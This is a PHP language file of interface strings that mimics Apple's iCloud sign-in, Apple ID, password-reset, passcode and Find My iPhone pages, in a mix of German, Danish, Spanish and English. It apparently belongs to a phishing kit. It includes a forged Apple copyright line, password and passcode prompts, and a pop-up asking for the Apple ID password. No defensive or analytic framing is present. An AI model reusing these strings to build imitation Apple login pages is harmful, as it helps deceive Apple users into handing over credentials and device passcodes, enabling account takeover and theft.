<?php
/**
 * Created by PhpStorm.
 * User: mustapha
 * Date: 5/6/17
 * Time: 10:31 PM
 */

//- iCloud sign in page
$lang[ 'Singin_message' ] = "Bei iCloud anmelden";
$lang[ 'Setup_message' ] = "Konfigurationsanweisungen";
$lang[ 'Help_message' ] = "Help and Support";
$lang[ 'Password_message' ] = "Adgangskode";
$lang[ 'RePassword_message' ] = "Re-Password";
$lang[ 'NewRePassword_message' ] = "New Re-Password";
$lang[ 'incorrect_message' ] = 'Deine Apple-ID oder dein Passwort war falsch';
$lang[ 'Keepsigin_message' ] = "Apple-ID merken";
$lang[ 'Forgotpassword_message' ] = "Apple-ID oder Passwort vergessen?";
$lang[ 'Forgotpassword2_message' ] = "Passwort vergessen?";
$lang[ 'DonthaveanAppleid_message' ] = "Don’t have an Apple ID?";
$lang[ 'Createyoursnow_message' ] = "Create yours now";
$lang[ 'Checkactivation_message' ] = "Check Activation Lock Status";
$lang[ 'Systemstatus_message' ] = "System Status";
$lang[ 'Privacy_message' ] = "Datenschutz";
$lang[ 'Terms_message' ] = "Nutzungsbedingungen";
$lang[ 'Copyrights_message' ] = 'Copyright © ' . date( 'Y' ) . ' Apple Inc. Alle Rechte vorbehaltern';
$lang[ 'iCloudsettings_message' ] = "iCloud Settings";
$lang[ 'Signout_message' ] = "Abmelden";
$lang[ 'VerificationFailed_message' ] = "Prüfung fehlgeschlagen";
$lang[ 'OK_message' ] = "OK";

//-- iCloud apps
$lang[ 'Reminders_message' ] = "Reminders";
$lang[ 'Notes_message' ] = "Notes";
$lang[ 'iCloudDrive_message' ] = "iCloud Drive";
$lang[ 'Photos_message' ] = "Photos";
$lang[ 'Contacts_message' ] = "Contacts";
$lang[ 'Mail_message' ] = "Mail";
$lang[ 'Settings_message' ] = "Settings";
$lang[ 'FindMyiPhone_message' ] = "Find min iPhone";
$lang[ 'Keynote_message' ] = "Keynote";
$lang[ 'Numbers_message' ] = "Numbers";
$lang[ 'FindFriends_message' ] = "Find Friends";
$lang[ 'Pages_message' ] = "Pages";

//- Maps connect Page
$lang[ 'Help_message' ] = "Hilfe";
$lang[ 'Createone_message' ] = "Create one";
$lang[ 'ForgotIDorPassword_message' ] = "Forgot ID or Password?";

//- iTunes Connect Page
$lang[ 'iTunesConnect_message' ] = "iTunes Connect";
$lang[ 'Rememberme_message' ] = "Apple-ID merken";

//- Apple ID Page
$lang[ 'SignIn_message' ] = "Anmelden";
$lang[ 'CreateYourAppleID_message' ] = "Opret dit Apple‑id";
$lang[ 'FAQ_message' ] = "FAQ";
$lang[ 'ManageyourAppleaccount_message' ] = "Verwalte deinen Apple‑Account";
$lang[ 'YourAppleIDorpasswordwasincorrect_message' ] = "Dit Apple-id eller din adgngskode er forket";
$lang[ 'YouraccountforeverythingApple_message' ] = "Dein Account für alles von Apple";
$lang[ 'AsingleAppleIDandpasswordgivesyouaccesstoallAppleservices_message' ] = "Mit einer Apple‑ID und einem Passwort hast du Zugriff auf alle Dienste von Apple.";
$lang[ 'LearnmoreaboutAppleID_message' ] = "Weitere Informationen zur Apple‑ID";
$lang[ 'TermsofUse_message' ] = "Terms of Use";
$lang[ 'AppleOnlineStore_message' ] = "Apple Online Store";
$lang[ 'visitan_message' ] = "visit an";
$lang[ 'AppleRetailStore_message' ] = "Apple Retail Store";
$lang[ 'orfinda_message' ] = "or find a";
$lang[ 'reseller_message' ] = "reseller";
$lang[ 'Shopthe_message' ] = "Shop the";
$lang[ 'AppleInfo_message' ] = "Apple Info";
$lang[ 'SiteMap_message' ] = "Site Map";
$lang[ 'HotNews_message' ] = "Hot News";
$lang[ 'RSSFeeds_message' ] = "RSS Feeds";
$lang[ 'ContactUs_message' ] = "Contact Us";
$lang[ 'Search_message' ] = "Search";

//- Compass Page
$lang[ 'FindMyiPhone_message' ] = "Mein iPhone suchen";
$lang[ 'Sign-InRequired_message' ] = "Du skal logge ind";
$lang[ 'Not_message' ] = "Er du ikke";


//- Reset Password Page
$lang[ 'ResetPassword_message' ] = "Reset Password";
$lang[ 'PasswordChanged_message' ] = "Password Changed";
$lang[ 'YourAppleIDpasswordfor_message' ] = "Your Apple ID password for";
$lang[ 'has_message' ] = "has";
$lang[ 'beenchanged_message' ] = "been changed";
$lang[ 'SignintoyourAppleIDaccountpagenowto_message' ] = "Sign in to your Apple ID account page now to";
$lang[ 'reviewyouraccountinformation_message' ] = "review your account information";
$lang[ 'GotoYourAccount_message' ] = "Go to Your Account";
$lang[ 'Enteranewpassword_message' ] = "Enter a new password";
$lang[ 'oldpassword_message' ] = "old password";
$lang[ 'newpassword_message' ] = "new password";
$lang[ 'confirmpassword_message' ] = "confirm password";
$lang[ 'Yourpasswordmusthave_message' ] = "Your password must have";
$lang[ 'ormorecharacters_message' ] = "8 or more characters";
$lang[ 'Upperlowercaseletters_message' ] = "Upper & lowercase letters";
$lang[ 'Atleastonenumber_message' ] = "At least one number";
$lang[ 'Strength_message' ] = "Strength";
$lang[ 'Avoidpasswordsthatareeasytoguessorusedwithotherwebsites_message' ] = "Avoid passwords that are easy to guess or used with other websites";
$lang[ 'YourAppleIDoroldpasswordwasincorrect_message' ] = "Your Apple ID or old password was incorrect";
$lang[ '_message' ] = "";
$lang[ '_message' ] = "";

//-- Login page
$lang[ 'Signsession_message' ] = "Sign in to start your session";
$lang[ 'Alert_message' ] = "Alert";
$lang[ 'Username_message' ] = "Username";
$lang[ 'Password_message' ] = "Passwort";
$lang[ 'Signin_message' ] = "Anmelden";
$lang[ 'User_message' ] = "User";

//- General Lang
$lang[ 'appleid_message' ] = "Apple-ID";
$lang[ 'Cancel_message' ] = "Abbrechen";
$lang[ 'required_message' ] = "Erforderlich";

//- Find my iphone page
$lang[ 'Alldevices_message' ] = "Alle enheder";
$lang[ 'Locating_message' ] = "Suchen";
$lang[ 'Alldevicesoffline_message' ] = "Alle enheder er offline";
$lang[ 'Nolocations_message' ] = "Der vises ingen lokalteter, da alle dine enheder er offline.";
$lang[ 'hourago_message' ] = "1 hour ago";
$lang[ 'Playsound_message' ] = "Ton abspielen";
$lang[ 'Lostmode_message' ] = "Modus Verloren";
$lang[ 'EraseiPhone_message' ] = "löschen";
$lang[ 'Notifyfound_message' ] = "Bei Fund benachrichtigen";
$lang[ 'Removeaccount_message' ] = "Remove from Account";
$lang[ 'Offline_message' ] = "Offline";

//- Passcode Page
$lang['access'] = "Need to find your device? Get quick access to:";
$lang['enterpasscode'] = "Enter passcode to contiune.";

//- New Fmi Template
$lang['manageappleid'] = "Gestiona tu cuenta de Apple";
$lang['No_Devices'] = "No Devices";
$lang['fmiSetup'] = "Set up your iCloud account on an iPhone, iPad, iPod touch or Mac to use Find My iPhone.";
$lang['MY_DEVICES'] = "MY DEVICES";
$lang['REFRESH'] = "REFRESH";
$lang['Seen_just_now'] = "Seen just now";
$lang['Old_Location'] = "Ort aktualisieren";


//- FMI PopUp

$lang['Enter_the_password_Apple'] = "Gib das Passwort für deine Apple-ID";
$lang['Apple_ID_Sign_Requested'] = "Bei iCloud anmelden";
$lang['Turn_On_Send_Last_Location'] = "Letzten Standort senden aktivieren";
$lang['Allow_Find_My_iPhone_to_store_the_last'] = "Erlaube der App ,Mein iPhone suchen den zuletzt bekannten Standort dieses iPhone bis zu 24 Stunden nach Entleeren der Batterie zu speichern.";
$lang['Not_Now'] = "Später ";
$lang['Turn_On'] = "Aktivieren";
$lang['Your_Apple_ID_or_password_is_incorrect'] = "Die Apple-ID oder das Passwort ist falsch";
$lang['Action'] = "Aktionen";
$lang['Updating_location'] = "Ort aktualisieren.";
$lang['Try_Again'] = "OK";